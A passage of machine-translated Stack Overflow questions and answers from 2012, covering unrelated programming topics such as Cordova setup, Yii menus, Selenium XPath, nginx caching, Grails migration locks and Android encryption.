> 时间：2016-09-17T08:26:41.673

您的连接字符串已打开。您可以使用代码来检查它：

```
if(cmd.Connection.State != ConnectionState.Open) cmd.Connection.Open(); 
```

# iphone - iphone内置画廊查看器

> ID：13343237
> 
> 赞同：1
> 
> 时间：2012-11-12T11:53:11.457
> 
> 标签：iphone, ios, gallery

在我的应用程序中，我有一个从网络下载的 UIImages 列表。我需要创建一个画廊，这些图像可以旋转、缩放和交换以查看下一个和上一个。有没有办法在 iphone 内置的画廊查看器中打开图像。否则我将不得不完成这一切。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T11:56:32.717

该功能称为 UIImagePickerController。

检查此以获取更多详细信息：

```
http://zcentric.com/2008/08/28/using-a-uiimagepickercontroller/ 
```

# php - Yii - 当我们查看静态页面时如何理解

> ID：13343239
> 
> 赞同：0
> 
> 时间：2012-11-12T11:53:17.623
> 
> 标签：php, menu, yii

我正在开发一个 Yii 项目，在菜单中，我想在访问特定项目时将菜单项设置为动态激活......我无法理解如何为静态页面执行此操作。这是我的代码：

```
 <?php $this->widget('zii.widgets.CMenu',array(
      'items'=>array(                   
           array('label'=>'Home', 'url'=>array('/site/index'),'active'=>(Yii::app()->controller->id=='site' && Yii::app()->controller->action->id=='index')),
           array('label'=>'About Us', 'url'=>array('/site/page', 'view'=>'about')), //HOW SHOULD I KNOW WHEN SHOULD THIS GET ACTIVE
           array('label'=>'News', 'url'=>array('/news/index'),'active'=>Yii::app()->controller->id=='news'),
           array('label'=>'Gallery', 'url'=>array('/images/index'), 'active'=>Yii::app()->controller->id=='images'),
           array('label'=>'Calendar', 'url'=>array('/calendar/index'), 'active'=>Yii::app()->controller->id=='calendar'),
           array('label'=>'Contact Us', 'url'=>array('/site/contact'), 'active'=>(Yii::app()->controller->id=='site' && Yii::app()->controller->action->id=='contact')),
        ),
 )); ?> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T12:09:45.693

试试看：

```
array(
    'label' => 'About Us', 
    'url' => array('/site/page', 'view'=>'about'),
    'active' => Yii::app()->controller->id == 'site' && 
                Yii::app()->controller->action->id == 'page' && 
                Yii::app()->request->getParam('view') == 'about'
), 
```

# java - 在 Selenium getattribute() 中同时使用文本和位置

> ID：13343240
> 
> 赞同：2
> 
> 时间：2012-11-12T11:53:19.417
> 
> 标签：java, html, xpath, selenium

我正在尝试为具有 ADF 生成树的网站使用 Selenium 构建测试框架。树最终具有以下结构

```
<table>
<tr>
 <td>
  <div>
   <span>
    <a id="AN_ID" title="Expand" onclick="return false" href="#"></a>
   </span>
   <img>
   <img>
   <span>SOME_TEXT</ span>
  </div>
 </td>
</tr>
<tr></tr>
<tr></tr>
</table> 
```

我希望有一个 XPath 函数，可以使用文本来查找锚的 id，如下所示：

```
selenium.getAttribute("xpath=//span[text()='"+text+"']/preceding-sibling::span[1]/child::a@id"); 
```

调用时将文本输入到函数中的位置。当字符串不是唯一的时，就会出现问题。所以我尝试在函数中添加一个位置，如下所示：

```
selenium.getAttribute("xpath=//span[text()='"+text+"']["+occurrence+"]/preceding-sibling::span[1]/child::a@id"); 
```

因此，该函数同时调用文本和字符串树中的出现。这正在查找第一次出现的 id，但它无法找到给定字符串第二次出现的 id。

我也尝试过使用

```
[text()= "" and position()= ""] 
```

但这根本不起作用。

每个锚点都会生成一个新表，其中包含子级别的所有表行（与上面的结构相同），因此您最终会为树的每个子级别创建一个新表。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T18:11:39.257

我相信事件应该在最后：

```
selenium.getAttribute("xpath=(//span[text()='"+text+"']/preceding-sibling::span[1]/child::a)["+occurrence+"]@id"); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:18:01.253

这种 HTML 结构是死板的，完全不可能改变吗？我建议你在这两个 span 中添加一个 id 或 class。这不就解决了一切吗...？

另一种解决方案是选择两个跨度中的第一个，例如`//table/tr/td/div/span[1]/a`.

# javascript - 使用 javascript 显示最近 3 个月的下拉列表

> ID：13343254
> 
> 赞同：0
> 
> 时间：2012-11-12T11:54:07.307
> 
> 标签：javascript, jsp, drop-down-menu, struts2

我正在尝试在下拉菜单中使用 javascript 显示本月的最后 3 个月（包括总共四个月）

```
function writeMonthOptions() {
    var months = new Array("01", "02", "03", "04", "05", "06", "07", "08",
            "09", "10", "11", "12");
    var today = new Date();
    var date = new Date(today);
    date.setFullYear(date.getFullYear() - 1);
    var dropDown = document.getElementById("Month_list");
    var i = today.getMonth();
    var optionNames;
    var optionValues;
    var beanData = '<s:property value="month" />';
    while (i < (today.getMonth() + 4)) {
        optionNames = months[i];
        optionValues = today.getFullYear() + '' + months[i];
        dropDown.options[i++] = new Option(optionNames, optionValues);
        if (beanData) {
            if (beanData == (today.getFullYear() + "" + monthsInd[today
                    .getMonth()])) {
                dropDown.selectedIndex = i - 1;
            }
        }
    }
} 
```

简单来说，在视图部分显示当前月份和前 3 个月的下拉列表。后端需要以 [YYYYMM] 的形式提交。

如果 bean 中已经存在值，则在下拉菜单中将其显示为选中。[保证在这4个月内]

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-12T12:22:38.223

此函数返回`n`最近几个月，包括当前月份：

```
function getLastMonths(n) {

    var months = new Array();

    var today = new Date();
    var year = today.getFullYear();
    var month = today.getMonth() + 1;

    var i = 0;
    do {
        months.push(year + (month > 9 ? "" : "0") + month);
        if(month == 1) {
            month = 12;
            year--;
        } else {
            month--;
        }
        i++;
    } while(i < n);

    return months;

} 
```

称呼：

```
document.write(getLastMonths(4)); 
```

印刷：

```
201211,201210,201209,201208 
```

[演示](http://jsfiddle.net/C2Qfe/)

* * *

然后，在下拉框中添加这些值非常容易：

```
function writeMonthOptions() {   

   var optionValues = getLastMonths(4);
   var dropDown = document.getElementById("monthList");

   for(var i=0; i<optionValues.length; i++) {
       var key = optionValues[i].slice(4,6);
       var value = optionValues[i];
       dropDown.options[i] = new Option(value, key);
    }

} 
```

只需使用：

```
writeMonthOptions(); 
```

[完整示例](http://jsfiddle.net/C2Qfe/2/)

# iphone - 得到印地语的结果

> ID：13343255
> 
> 赞同：1
> 
> 时间：2012-11-12T11:54:13.690
> 
> 标签：iphone, objective-c, fonts

我正在开发一个应用程序，其中有一些文本视图。一个文本视图显示默认语言，如英语，另一个文本视图以另一种文本样式（如阿拉伯语、Flamer 样式等）显示相同的文本。为此，我使用了 .ttf 文件，但现在，我想以印地语字体样式更改该文本。我想要像“ `sudha`”这样的文本作为“ `सुधा`”。我怎样才能做到这一点。

如果有人对此有任何想法，请告诉我。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T13:39:09.560

苏达你可以试试这个：

```
@autoreleasepool{ // text view code here 
    [textViewAbout setFont:[UIFont fontWithName:@"NewFont" size:24]];
} 
```

# android - Phonegap 设置 Cordova 错误 创建错误

> ID：13343257
> 
> 赞同：14
> 
> 时间：2012-11-12T11:54:22.237
> 
> 标签：android, cordova, installation

我正在尝试设置一个基本的 Hello World phonegap android 应用程序。我已经安装并正确配置了 ant、java jdk 和 android sdk 的路径。但是，当我尝试运行时

```
create C:\Users\Shoes\Documents\Dev\Test com.codebundle.test Test 
```

和科尔多瓦给了我以下错误

```
Missing one of the following:
JDK: http://java.oracle.com
Android SDK: http://developer.android.com
Apache ant: http://ant.apache.org 
```

我已经通过尝试测试了所有路径都设置正确

```
ant
adb
java 
```

一切正常，请帮助

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2012-11-12T16:22:21.293

如果你输入“android”会发生什么？您需要确保 $ANDROID_HOME/tools 和 $ANDROID_HOME/platform-tools 都在您的 $PATH 中。

[http://docs.phonegap.com/en/2.2.0/guide_getting-started_android_index.md.html#Getting%20Started%20with%20Android](http://docs.phonegap.com/en/2.2.0/guide_getting-started_android_index.md.html#Getting%20Started%20with%20Android)

昨晚和一个朋友一起工作，他的问题是 JRE 在他的路上，而不是 JDK。因此，当他键入 javac 时，找不到它。如果您有同样的问题，您需要更新您的 PATH 以指向 JDK 的位置。

* * *

## 回答 #2

> 赞同：14
> 
> 时间：2012-11-23T22:29:23.480

将路径添加到**PATH**变量是不够的。您需要使用 JDK 的 bin 文件夹的路径显式添加**JAVA_HOME**，例如：

```
 JAVA_HOME -> C:\Program Files\Java\bin 
```

Phonegap/Cordova 正在您的设置中寻找**JAVA_HOME**变量。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2013-02-02T12:50:44.337

设置以下两个环境变量

```
C:\>set ANT_HOME="C:\apache-ant-1.8.4\"

C:\>set JAVA_HOME="C:\Program Files\Java\jdk1.7.0_04\" 
```

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2012-11-21T10:31:12.133

将 javac 的路径设置到您的 PATH 变量中，这对我来说很好，我遇到了同样的问题。我将这三个文件夹添加到 PATH 变量中：

```
 C:\Program Files\Java\jdk1.7.0_05;
   C:\Program Files\Java\jdk1.7.0_05\bin;
   C:\Program Files\Java\jdk1.7.0_05\lib 
```

当您在 Windows 中使用 cmd 时，您必须能够从任何地方运行这些命令：

```
 javac
  java
  ant 
```

当您可以在没有错误的 cmd 上执行此操作时，cordova 将运行。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2015-01-26T23:59:13.757

通过六个简单的步骤设置 PhoneGap 项目。

[http://wezeste.blogspot.in/201](http://wezeste.blogspot.in/201) ...

1.  [从 -> http://phonegap.com/install/](http://phonegap.com/install/)下载最新的 phonegap 版本

2.  解压缩并转到下载的phonegap zip的android/bin目录

3.  设置不同的路径：（您也可以在环境中执行此操作）

java: 设置路径=%PATH%;C:\Program Files (x86)\Java\jdk1.7.0_21\bin

蚂蚁：设置路径=%PATH%;C:\apache-ant-1.9.4\bin

JAVA_HOME：设置 JAVA_HOME=C:\Program Files (x86)\Java\jdk1.7.0_21\bin

4.  使用命令创建 android peoject – 创建目的地 [包名] [项目名]

创建 D:\AndroidProjects com.project.example 你好

5.  导入eclipse中创建的android项目

6.  下载并在项目的 lib 中添加 cordova-2.2.0.jar。

运行您的第一个测试应用程序

谢谢

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-04T13:17:21.940

我已经做对了，但仍然收到此消息：

```
Missing one of the following:
JDK: http://java.oracle.com
Android SDK: http://developer.android.com
... 
```

我的解决方案是将所有内容添加到我的用户变量 PATH 而不是系统变量 PATH

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2013-01-25T12:37:42.763

问题是 create cannot find `javac.exe`，在 Path 中也包含 bin 目录：（`C:\Program Files\Java\jdk1.7.0_11\bin`在我的情况下）。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2013-02-19T23:47:55.333

我编辑了我的系统路径变量，最后看起来像这样，我添加了很多，但似乎我不得不因为它才解决了

```
D:\Python27\Lib\site-packages\PyQt4;%CommonProgramFiles%\Microsoft Shared\Windows Live;c:\bin;D:\Program Files (x86)\NVIDIA Corporation\PhysX\Common;D:\Program Files (x86)\PC Connectivity Solution\;%SystemRoot%\system32;%SystemRoot%;%SystemRoot%\System32\Wbem;%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\;d:\wamp\bin\php\php5.2.6\;d:\cygwin\bin;D:\Program Files (x86)\Android\android-sdk\platform-tools;D:\Program Files (x86)\Android\android-sdk\tools;D:\wamp\bin\mysql\mysql5.0.51b\bin;D:\Program Files\Java\jdk1.7.0_01;D:\Program Files\Java\jdk1.7.0_01\bin;D:\Program Files\Java\jdk1.7.0_01\lib;D:\SDK\apache-ant-1.8.4;D:\SDK\apache-ant-1.8.4\bin;D:\SDK\apache-ant-1.8.4\lib 
```

编辑路径后，您应该在运行测试“java”“ant”“adb”或“javac”命令之前打开一个新的命令提示符窗口（在 Windows 中）

# maven - 如何运行我的可执行战争以与 Maven 进行集成测试？

> ID：13343259
> 
> 赞同：0
> 
> 时间：2012-11-12T11:54:24.557
> 
> 标签：maven, integration-testing, tomcat7, executable-jar, maven-failsafe-plugin

我正在使用[tomcat7-maven-plugin](http://tomcat.apache.org/maven-plugin-2.1-SNAPSHOT/executable-war-jar.html)生成一个可以运行的 jar，其中包含一个或多个具有适当配置的战争。

我想在运行集成测试之前启动这个 jar，并在完成后停止它。我知道[故障安全插件](http://maven.apache.org/surefire/maven-failsafe-plugin/)是进行测试的方法，而且似乎通常您会使用[cargo 插件](http://cargo.codehaus.org/Maven2+plugin)来启动应用服务器并部署您的战争。我想运行我的 jar 而不是使用 cargo 进行更真实的测试。

如何在测试开始时启动 jar 并在完成时停止？理想情况下，我想使用插件来做到这一点，而不是自己编写代码。

# java - Scala 中与服务器的类 Telnet 连接

> ID：13343260
> 
> 赞同：4
> 
> 时间：2012-11-12T11:54:27.977
> 
> 标签：java, sockets, scala, networking

我正在尝试编写一个`Connector`类，它将为我提供一个基于文本的 IO 来往一个服务器，该服务器本身只以文本通信。所以，基本上，一个`telnet`克隆。到目前为止，我已经写了这个：

```
import java.net._
import scala.actors.Actor
import Actor._
import java.io._

class Connector(socket: Socket, handler: String => Unit) {
  private val out = new PrintStream(socket.getOutputStream)
  private val in = new BufferedReader(new InputStreamReader(socket.getInputStream))

  private val receiver = actor {
    var msg = in.readLine
    while (msg != null) {
      handler(msg)
      msg = in.readLine
    }
  }

  def print(msg: String) = out.println(msg)

  def close = {
    in.close
    out.close
  }
} 
```

我现在尝试用这个连接到服务器（用于测试）

```
import java.net._
import java.io._
import InetAddress.getByName

object Main extends App {
  val addr = getByName("wolfwings.us")
  val socket = new Socket(addr, 4000)

  val connector = new Connector(socket, ((msg) => println(msg)))

  val stdIn = new BufferedReader(new InputStreamReader(System.in))

  var input = stdIn.readLine
  while(input != null) {
    connector.print(input)
    input = stdIn.readLine
  }

  stdIn.close
  connector.close
} 
```

发生的事情是：它正确连接并向我发送服务器的问候屏幕。然后它停在文本中间。当我现在输入时，它会输出问候文本的最后一行，然后是剩下的，减去最后一行。等等。`\n`此外，它在每一行后面都放了额外的东西。当我用 替换`println`时，突然`print`没有s。`\n`

据我所知，这一切都应该正常工作。我的意思是，这不是像这样的简单文本IO是高级巫术吗？我在这里不知道哪些隐藏的怪癖？

**编辑**：更正：经过一些尝试和研究，我发现实际上，该程序只吞噬了服务器响应的最后一行。似乎服务器本身有时不会发送完整的行，所以客户端当然会读取它们。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:53:35.073

我已经为自己修复了它，似乎我做了很多没有得到满足的假设。

```
 private val receiver = actor {
    var done = false
    while (!done) {
      val n = in.read
      if(n < 0)
        done = true
      else
        handler(n.toChar)
    }
  } 
```

现在它似乎工作正常，我可以继续。

# php - PHP Require - 失败响应

> ID：13343261
> 
> 赞同：1
> 
> 时间：2012-11-12T11:54:30.893
> 
> 标签：php, require

我正在使用 ajax 调用从我的联系表单中发送消息。但是，我想将服务器响应打印回用户，如果它成功或失败，我想报告 class.phpmailer.php 是否由于某种原因丢失，但这对我不起作用，所以怎么可能我在需要失败时显示自定义错误消息？

```
require "class.phpmailer.php"; or die("<span style='color:red;'>Tiedosto class.phpmailer.php puuttuu! Viestin lähetys epäonnistui!</span>"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T11:58:24.933

您需要先检查文件是否存在，然后进行导入，如果找不到文件，它将向用户显示您的消息。

```
if(file_exists('class.phpmailer.php')){ 
    include "class.phpmailer.php"; 
}else{ 
    echo"<span style='color:red;'>Tiedosto class.phpmailer.php puuttuu! Viestin lähetys epäonnistui!</span>"; 
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T11:57:44.643

Require 会产生一个 E_COMPILE_ERROR，它在您的 IF 中是无法捕获的。

# caching - HTTP 缓存标头 CDN 提供永不更改的内容

> ID：13343263
> 
> 赞同：0
> 
> 时间：2012-11-12T11:54:42.980
> 
> 标签：caching, nginx, cdn

我正在提供永远不会随广告服务器更改的静态图像，并且我看到 http 标头包括以下内容：

缓存控制：max-age=315360000

语用：公共

缓存控制：公共，必须重新验证，代理重新验证

如何让浏览器缓存数据？我的源服务器是 nginx。

谢谢！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:28:17.567

添加`expires max;`到静态图像的位置，请参阅[http://nginx.org/en/docs/http/ngx_http_headers_module.html#expires](http://nginx.org/en/docs/http/ngx_http_headers_module.html#expires)

更新：

要将其应用于特定目录-假设是子目录图像-您将添加以下内容：

```
location /images/ {
  expires max;
} 
```

# java - 在 Java 中调试时检查数据

> ID：13343269
> 
> 赞同：1
> 
> 时间：2012-11-12T11:55:24.447
> 
> 标签：java, eclipse, debugging

假设我们正在调试一个应用程序，并且您有一个包含 1000 个项目的链表、哈希图或其他集合框架实现。是否有可能在调试而不是以编程方式检查给定项目的列表或映射？假设我们使用 eclipse 作为 ide。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-12T11:59:43.277

在你`Debug`看来

![](../Images/7ed3b90b9c61f57c2d155f7ee3e68787.png)

有`Variables`view ，您可以在其中查看当前上下文中每个对象的内部结构和元素。

![](../Images/3873cd54eb8fbcb85103d7812d354422.png)

在`Expressions`视图中，您可以添加自定义单行表达式以获得任何结果。

![](../Images/e26c4f1c34556a584ca874e64d34c009.png)

也许，`Display`视图会很有用，您可以在其中执行一组 Java 表达式。

![](../Images/1b7bf74bf61d971ba458aa18ea83b4f9.png)

# sql - Merge two records when state is changed in a update statement?

> ID：13343271
> 
> 赞同：-1
> 
> 时间：2012-11-12T11:55:31.393
> 
> 标签：sql, sql-server, stored-procedures

I have a update statement that will change the state in a tableA from TableB. The data in this table is like:

```
Serial   PersonId    Date        Department    State      Begintime    Endtime
    1       1        2012-01-01      50          1        08:00        11:00
    2       1        2012-01-01      50          5        11:00        14:00 
```

When I get State 2 from tableB then I need to set the states of the both records to: 2 but I want have just one record for each state.

The result should be:

```
Serial   PersonId    Date        Department    State     Begintime     Endtime
    1       1        2012-01-01      50          2       08:00         14:00 
```

Vice versa also must be possible:
TableA contains:

```
Serial   PersonId    Date        Department    State     Begintime     Endtime
    1       1        2012-01-01      50          2       08:00         14:00 
```

After the update I would like to have: (this two records are coming from tableB)

```
Serial   PersonId    Date        Department    State      Begintime    Endtime
    1       1        2012-01-01      50          1        08:00        10:00
    2       1        2012-01-01      50          5        12:00        15:00 
```

I also don't know if this need to be updated with a update statement.
Any ideas to solve this?

I'm using sql server 2005.

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-16T03:40:12.843

艾哈迈德，这对你有用吗？

```
INSERT INTO tableA a
SELECT * FROM tableB b
WHERE b.[State] NOT IN (
    SELECT [State] FROM tableA
) 
```

我假设您想要在表之间复制新记录。

# grails - Grails 应用程序在启动时卡住，因为 DATABASECHANGELOG 表被锁定

> ID：13343283
> 
> 赞同：3
> 
> 时间：2012-11-12T11:56:35.800
> 
> 标签：grails, grails-plugin, database-migration

我在 Heroku 上托管了一个使用数据库迁移插件的 Grails 应用程序。有时，当应用程序重新启动时，它会在启动时卡住而没有任何帮助消息：

```
2012-11-12T11:21:06+00:00 app[web.1]: Configuring Spring Security Core ...
2012-11-12T11:21:06+00:00 app[web.1]: ... finished configuring Spring Security Core
2012-11-12T11:21:06+00:00 app[web.1]:
2012-11-12T11:21:22+00:00 heroku[web.1]: Stopping process with SIGKILL
2012-11-12T11:21:22+00:00 heroku[web.1]: Error R10 (Boot timeout) -> Web process failed to bind to $PORT within 60 seconds of launch
2012-11-12T11:21:24+00:00 heroku[web.1]: Process exited with status 137
2012-11-12T11:21:34+00:00 heroku[router]: Error H20 (App boot timeout) -> GET abc.herokuapp.com/ dyno= queue= wait=75000ms service= status=503 bytes=
2012-11-12T11:22:34+00:00 heroku[router]: Error H20 (App boot timeout) -> GET abc.herokuapp.com/ dyno= queue= wait=75000ms service= status=503 bytes=
2012-11-12T11:25:10+00:00 heroku[router]: Error H10 (App crashed) -> GET abc.herokuapp.com/ dyno= queue= wait= service= status=503 bytes= 
```

经过一番调查，我发现这是因为 DATABASECHANGELOGLOCK 表上有一条记录，列 LOCKED=TRUE。当我手动将 LOCKED 值设置为 FALSE 并重新启动应用程序时，启动过程会顺利完成。

我的问题是：

1.  如何找到导致数据库更改日志锁定的原因以及如何避免它。
2.  如果无法避免锁定，有什么方法可以在应用程序启动过程卡住之前清除锁定？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:56:09.093

当应用程序在引导过程中被终止并且数据库迁移无法完成其数据库事务时，我的项目中发生了此问题。

liquibase（数据库迁移使用的底层库）所做的是，它创建锁条目，然后启动数据库事务以处理所有需要应用的更改集。如果有任何机会，db 事务没有成功提交，锁条目将保留在`DATABASECHANGELOGLOCK`.

前段时间在[liquibase 论坛](http://forum.liquibase.org/topic/aborting-liquibase-mid-process-affects-databasechangelog-integrity-and-leaves-lock-hanging-around)中已经提出了同样的问题。

该`DATABASECHANGELOG`表记录了成功应用的 db 更改集，您可以使用[dbm-db-doc](http://grails-plugins.github.com/grails-database-migration/docs/manual/ref/Documentation%20Scripts/dbm-db-doc.html)或[DbDocController](http://grails-plugins.github.com/grails-database-migration/docs/manual/guide/8%20DbDoc%20Controller.html)来可视化此信息（当然，您也可以直接使用 SQL 访问 db 表）。

# android - wrap_content 不适用于 Android 4.0 中的 TextView

> ID：13343284
> 
> 赞同：2
> 
> 时间：2012-11-12T11:56:39.920
> 
> 标签：android, android-layout, textview

我有一个包含 2 个 TexView 的 LinearLayout，其中 layout_height 设置为**wrap_content**。通常，如果 TextView 不包含任何数据，则其 Height 变为 0（这就是 wrap_content 所做的）。这在 Android 3.2 中按预期工作，但在 Android 4.0 中，它留下了一个空白空间！请问有什么解释吗？

```
<LinearLayout
    android:layout_width="fill_parent"
    android:layout_height="wrap_content"
    android:orientation="vertical"> 

    <TextView
        android:id="@+id/tv_1"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:textSize="25sp"
        android:textStyle="bold" />

    <TextView
        android:id="@+id/tv_2"
        android:layout_width="fill_parent"
        android:layout_height="wrap_content"
        android:textSize="25sp"
        android:textStyle="bold" />
</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2014-04-13T21:23:43.227

默认情况下，TextView 由空字符串初始化，因此在您的情况下，TextView 的高度由空字符串的 textSize 定义，即 25sp，因此实际上它可以正常工作。如果要隐藏空的 TextView 使用`visibility="gone"`属性。

# ios - iOS In House 应用程序 - 无法下载应用程序

> ID：13343286
> 
> 赞同：2
> 
> 时间：2012-11-12T11:56:53.927
> 
> 标签：ios, iphone-developer-program, distribute, in-house-distribution

我正在尝试分发 In House 应用程序，但是当我尝试安装该应用程序时，我收到错误“无法下载应用程序”。

```
Nov 12 12:33:41 iPhone-Rick installd[31] <Error>: 0x2ffc6000 handle_install: Install of "/var/mobile/Media/Downloads/1532059304834931943/8956635784114205146" requested by itunesstored

��Nov 12 12:33:43 iPhone-Rick installd[31] <Error>: 0x2ffc6000 MobileInstallationInstall_Server: Installing app com.Tim-Online.T-S-Zeeland

��Nov 12 12:33:43 iPhone-Rick installd[31] <Error>: Nov 12 12:33:43  SecTrustEvaluate  [leaf CriticalExtensions IssuerCommonName]

��Nov 12 12:33:44 iPhone-Rick installd[31] <Error>: 0x2ffc6000 verify_signer_identity: MISValidateSignatureAndCopyInfo failed for /var/tmp/install_staging.qVkZ5j/foo_extracted/Payload/T&S Zeeland.app/T&S Zeeland: 0xe8008017

��Nov 12 12:33:44 iPhone-Rick installd[31] <Error>: 0x2ffc6000 do_preflight_verification: Could not verify executable at /var/tmp/install_staging.qVkZ5j/foo_extracted/Payload/T&S Zeeland.app
��
Nov 12 12:33:44 iPhone-Rick itunesstored[70] <Error>: 0x1b6e000 MobileInstallationInstall: failed with -1

��Nov 12 12:33:44 iPhone-Rick installd[31] <Error>: 0x2ffc6000 install_application: Could not preflight application install

��Nov 12 12:33:44 iPhone-Rick installd[31] <Error>: 0x2ffc6000 handle_install: API failed 
```

这是我的 Xcode 设置的概述：[http ://rido.me/hI26](http://rido.me/hI26)

这是我的 Organizer -> 分发屏幕的屏幕截图：[http ://rido.me/9C5g](http://rido.me/9C5g)

有人知道我该如何解决这个问题吗？我已经尝试了一切，但我找不到解决方案..

非常感谢！

# ssis - 仅当每个循环中没有垃圾数据时才处理平面文件

> ID：13343289
> 
> 赞同：0
> 
> 时间：2012-11-12T11:57:07.217
> 
> 标签：ssis, foreach-loop-container

我有一个用于处理平面文件的 for each 循环容器。一些文件可能包含垃圾数据。我想忽略这些文件并处理其他文件而不会出现包失败。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:11:32.537

我过去所做的是使用容器中的平面文件**目标**`foreachloop`作为错误输出，以便将源文件中的任何不良数据发送到那里并且包不会失败。

您所做的是将其插入并将`flatfile destination`其`forechloop`连接到平面文件源。

完成此操作后，编辑`Flatfile destination`并将其指向并将`error.txt`列映射到错误输出列。这对我来说可以摆脱不良数据。

# elasticsearch - 如何在弹性搜索中搜索自由文本？

> ID：13343292
> 
> 赞同：0
> 
> 时间：2012-11-12T11:57:22.850
> 
> 标签：elasticsearch

在弹性搜索中，我们如何搜索自由文本。例如，我们在“ **test！£！£”！£“test** ”之类的属性之一中有自由文本数据。

当我使用 QueryBuilders 进行搜索时，由于特殊字符而出现异常。

在搜索网络时，知道我们需要使用来自 Lucene 的 escapeUtils。`QueryParser.escape(searchText)`

现在，当我在这种情况下进行完全匹配搜索时，它会忽略这些字符并显示“测试”的结果。

请就此提出一些建议。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-12T14:37:21.163

您可能正在使用默认映射，因此[`StandardAnalyzer`](http://www.elasticsearch.org/guide/reference/index-modules/analysis/standard-analyzer.html). 我想它正在剥离那些甚至没有被索引的字符。您需要决定如何索引您的文本。你想标记化还是想要一个标记？您想将这些字符保留在索引中吗？基于此，您需要选择正确的分析器并通过[Put 映射 API](http://www.elasticsearch.org/guide/reference/api/admin-indices-put-mapping.html)更新您的映射。例如，如果您想按原样索引文本，只需将字段配置为`"index":"not_analyzed"`，这意味着将对其上下文进行索引，但不会对其应用文本分析。

# android - android:是否可以加密文件夹

> ID：13343296
> 
> 赞同：1
> 
> 时间：2012-11-12T11:57:34.410
> 
> 标签：android, file, encryption, aes, android-gallery

很抱歉问这个问题，但我不清楚加密和解密文件夹，我正在尝试加密一堆选定的图像，如本文 [加密/解密](https://stackoverflow.com/questions/10782187/how-to-encrypt-file-from-sd-card-using-aes-in-android)中提到的，但加密一堆选定的图像需要很多时间，所以我尝试加密包含所选图像的文件夹，但它给了我 filenotfoundexception:open failed(is a directory) 我已经更新了加密功能，如下所示

```
static void encrypt() throws IOException, NoSuchAlgorithmException, NoSuchPaddingException, InvalidKeyException {
// Here you read the cleartext.
FileInputStream fis = new FileInputStream(Environment.getExternalStorageDirectory()+"/.myapp/.private");
// This stream write the encrypted text. This stream will be wrapped by another stream.
FileOutputStream fos = new FileOutputStream(Environment.getExternalStorageDirectory()+"/.myapp/.encyrpted");

// Length is 16 byte
SecretKeySpec sks = new SecretKeySpec("MyDifficultPassw".getBytes(), "AES");
// Create cipher
Cipher cipher = Cipher.getInstance("AES");
cipher.init(Cipher.ENCRYPT_MODE, sks);
// Wrap the output stream
CipherOutputStream cos = new CipherOutputStream(fos, cipher);
// Write bytes
int b;
byte[] d = new byte[8];
while((b = fis.read(d)) != -1) {
    cos.write(d, 0, b);
}
// Flush and close streams.
cos.flush();
cos.close();
fis.close();} 
```

那么如何加密文件夹 sdcard/.myapp/.private 以便我可以减少加密一大堆图像的时间？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-12T12:01:07.437

I think you want to encrypt folder as well as sub contain data.

See this may be its helpful to you.

[Can we Encrypt a folder in android?](https://stackoverflow.com/questions/6266076/can-we-encrypt-a-folder-in-android)

# javascript - jQuery隐藏iframe文件上传

> ID：13343297
> 
> 赞同：4
> 
> 时间：2012-11-12T11:57:34.537
> 
> 标签：javascript, jquery, html, iframe

我们正在尝试使用隐藏的 iframe 上传文件，并且脚本在除 IE(9) 之外的所有浏览器中运行。

*   用户点击链接
*   链接触发文件输入打开
*   文件输入更改触发表单提交
*   表单提交到 iframe

IE9 开发者工具返回以下错误信息：

```
SCRIPT5: Access is denied.
jquery-latest.js, line 2977 character 6 
```

环顾四周，这似乎是与 jQuery`change()`事件一起发生的错误。相当肯定它一定是一个简单的解决方案......如果你能提供帮助，非常感谢！

**HTML**

```
<form class="hidden" action="index.php?upload" method="POST" id="myForm" enctype="multipart/form-data" target="hidden_iframe">
    <input type="file" name="userfile" id="userFile">
    <input type="submit">
</form>

<iframe id="hidden_iframe" class="hidden" name="hidden_iframe" src="inc/temp.html"></iframe> 
```

**Javascript**

```
$('#fake').on("click",function(e){
    e.preventDefault();
    $('#userFile').click();
    return false;
});
$('#real').on("change",function(e){
    e.preventDefault();
    $("#myForm").submit();
}); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-11-12T12:08:48.023

这是 IE 安全设​​置。只需转到设置-> Internet 选项-> 安全-> 自定义级别，然后更改“其他”下的安全设置，将“跨域访问数据源”设置为启用。

编辑：

我刚看到有什么问题。您正在触发文件上传，但不允许这样做。您需要让用户*手动*单击文件选择器按钮。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-12T12:18:56.023

也许您应该完全考虑替代解决方案？

现在通过隐藏的 iframe 上传并不是最好的方法。

看看这个很棒的库：[http ://www.plupload.com/](http://www.plupload.com/)

# r - R：R中“无法分配向量大小n mb”的任何其他解决方案？

> ID：13343299
> 
> 赞同：7
> 
> 时间：2012-11-12T11:57:43.970
> 
> 标签：r, memory

我的问题在于对大数据集（大约 2500 万行和 10 列，即大约 1GB 数据）的简单计算。我的系统是：

```
